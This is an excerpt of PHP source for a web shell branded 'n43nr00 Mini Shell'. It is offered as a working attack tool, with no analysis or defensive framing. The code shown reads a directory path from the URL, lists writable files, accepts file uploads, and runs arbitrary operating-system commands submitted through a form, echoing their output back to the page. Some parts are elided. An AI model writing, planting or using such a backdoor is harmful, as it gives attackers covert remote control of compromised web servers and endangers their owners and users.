...
<title>Lonte Mahal~</title>
<style>
body{
	font-family: "Racing Sans One", cursive;
	background-image: url("https://wallpapercave.com/wp/wp2629127.jpg");
	color:White;
...
<body>
<h1><center><font color="Red">-[ n43nr00 Mini Shell ]-</font></center></h1>
<table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
<tr><td>';
echo "Disable Functions: $liatds";
echo '<br><font color="Dark">Path :</font> ';
if(isset($_GET['path'])){
$path = $_GET['path'];
}else{
$path = getcwd();
...
<font color="Dark">File Upload :</font> <input type="file" name="file" />
<input type="submit" value="upload" />
</form>';
echo "<form method='post'>
<font color='Dark'>Command :</font>
<input type='text' size='30' height='10' name='cmd'><input type='submit' name='execmd' value=' Execute '>
</form>
</td></tr>";
if($_POST['execmd']) {
echo "<center><textarea cols='60' rows='10' readonly='readonly' style='color:Black; background-color:grey;'>".exe($_POST['cmd'])."</textarea></center>";
}
echo "<br></td></tr>";
...
<td><center>--</center></td>
<td><center>';
if(is_writable($path.'/'.$dir)) echo '<font color="black">';
...
echo '<center><br/><font color="grey">n43nr00 Mini Shell</font><br>';
echo "[ <a href='?path=$path&go=cabs'>./Exit</a> ]
</center>
</body>
</html>";
